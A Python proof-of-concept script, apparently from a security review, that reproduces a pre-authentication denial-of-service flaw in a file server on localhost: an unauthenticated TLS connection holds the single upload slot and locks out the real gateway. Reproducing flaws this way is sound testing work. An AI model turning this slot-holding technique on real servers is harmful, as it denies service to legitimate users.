#!/usr/bin/env python3
"""Repro: the single-upload 'busy' flag is taken BEFORE authentication, so an unauthenticated client
that only completes the TLS handshake (no token) denies service to the real gateway.
Runs the unmodified sheep_file_server.FileServer against a throw-away self-signed cert on 127.0.0.1.
Usage: python repro_busy_slot_dos.py <bundle_root>
"""
import asyncio, datetime, ipaddress, os, ssl, struct, sys, tempfile, time
from pathlib import Path
bundle = Path(sys.argv[1]).resolve(); sys.path.insert(0, str(bundle / 'outputs/hourly_sd_cloud'))
import sheep_file_server as srv
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

async def main():
    tmp = Path(tempfile.mkdtemp()); key = rsa.generate_private_key(65537, 2048); name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 't')])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key()).serial_number(1)
            .not_valid_before(now - datetime.timedelta(minutes=1)).not_valid_after(now + datetime.timedelta(days=1))
            .add_extension(x509.SubjectAlternativeName([x509.IPAddress(ipaddress.ip_address('127.0.0.1'))]), False)
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), True).sign(key, hashes.SHA256()))
    (tmp/'c').write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    (tmp/'k').write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
    sctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); sctx.load_cert_chain(tmp/'c', tmp/'k')
    token = b'a' * 64; handler = srv.FileServer(tmp/'files', token, reserve=0)
    server = await asyncio.start_server(handler.handle, '127.0.0.1', 0, ssl=sctx, ssl_handshake_timeout=10, limit=32768)
    port = server.sockets[0].getsockname()[1]
    cctx = ssl.create_default_context(cafile=str(tmp/'c'))
    async def legit():
        r, w = await asyncio.open_connection('127.0.0.1', port, ssl=cctx)
        w.write(b'SFU2' + token)
        try: ok = await asyncio.wait_for(r.readexactly(4), 3) == b'OKAY'
        except (asyncio.IncompleteReadError, asyncio.TimeoutError, ConnectionError): ok = False
        w.close(); return ok
    print('baseline legit gateway authenticates       :', await legit())
    await asyncio.sleep(1.5)   # let the baseline handler release the slot (it waits for the 42-byte metadata/EOF)
    t0 = time.time()
    ar, aw = await asyncio.open_connection('127.0.0.1', port, ssl=cctx)   # attacker: TLS only, sends nothing, no token
    await asyncio.sleep(0.3)
    print('legit gateway while attacker holds the slot :', await legit(), '(False = denied)')
    await asyncio.sleep(4)
    print('...still denied 4 s later (True = denied)    :', not await legit(), f'(slot held {time.time()-t0:.1f}s; server waits 30 s per read, attacker can reconnect forever)')
    aw.close(); await asyncio.sleep(0.5)
    print('after attacker leaves, legit works again     :', await legit())
    server.close()
asyncio.run(main())
